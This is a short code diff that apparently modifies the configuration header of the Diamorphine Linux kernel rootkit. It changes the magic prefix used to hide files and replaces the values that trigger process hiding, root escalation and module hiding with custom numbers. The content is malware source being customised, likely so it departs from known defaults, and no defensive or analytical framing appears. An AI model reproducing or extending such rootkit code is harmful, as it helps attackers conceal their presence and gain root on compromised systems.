@@ -5,16 +5,16 @@ struct linux_dirent {
         char            d_name[1];
 };
 
-#define MAGIC_PREFIX "diamorphine_secret"
+#define MAGIC_PREFIX "skittles"
 
 #define PF_INVISIBLE 0x10000000
 
 #define MODULE_NAME "diamorphine"
 
 enum {
-	SIGINVIS = 31,
-	SIGSUPER = 64,
-	SIGMODINVIS = 63,
+	SIGINVIS = 666,
+	SIGSUPER = 777,
+	SIGMODINVIS = 999,
 };
 
 #ifndef IS_ENABLED
